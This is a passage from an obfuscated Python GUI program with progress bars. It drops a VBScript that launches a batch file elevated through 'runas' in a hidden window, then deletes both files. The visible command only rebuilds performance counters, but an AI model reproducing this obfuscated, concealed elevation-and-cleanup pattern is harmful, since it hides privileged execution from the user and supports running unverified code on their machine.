        OO0000O0000O0OO00 .write (r'Set objShell = CreateObject("Shell.Application")'+"\n")#line:858
        OO0000O0000O0OO00 .write (r'objShell.ShellExecute "x2.bat", "/c lodctr.exe /r" , "", "runas", 0')#line:859
        OO0000O0000O0OO00 .close ()#line:860
        os .system ('xx2.vbs')#line:862
        time .sleep (0.1 )#line:863
        os .remove ("xx2.vbs")#line:864
        os .remove ("x2.bat")#line:865
    except :#line:866
        os .remove ("xx2.vbs")#line:867
        os .remove ("x2.bat")#line:868
if __name__ =="__main__":#line:870
    OOO0OOOOOOO0OOO0O =threading .Thread (target =OOO00OO00OO00O0O0 )#line:875
    OOO0OOOOOOO0OOO0O .start ()#line:876
    OOO0OOOOOOO0OOO0O .join ()#line:877
    O0000OOOO000O00OO =threading .Thread (target =OOOOOO000OOOOO000 ).start ()#line:878
    O0O00OO0O0OOOO0O0 =O0000000O000OOOOO (1000 ,OOO0O0O0O0OOOOO00 )#line:874
    O00000000OOOOO0OO =DoubleVar ()#line:880
    OO000OOOOO0OOO000 =DoubleVar ()#line:881
    OOOO000OO00O0O0O0 =ttk .Progressbar (O0O00000OO0OO00OO ,orient =HORIZONTAL ,length =685 ,mode ='determinate')#line:882
    OOOO000OO00O0O0O0 .pack ()#line:883
    OO00O000O00OOO0O0 =ttk .Progressbar (O0O00000OO0OO00OO ,orient =HORIZONTAL ,length =685 ,mode ='determinate')#line:884
    OO00O000O00OOO0O0 .pack ()#line:885
O0O00000OO0OO00OO .mainloop ()#line:888
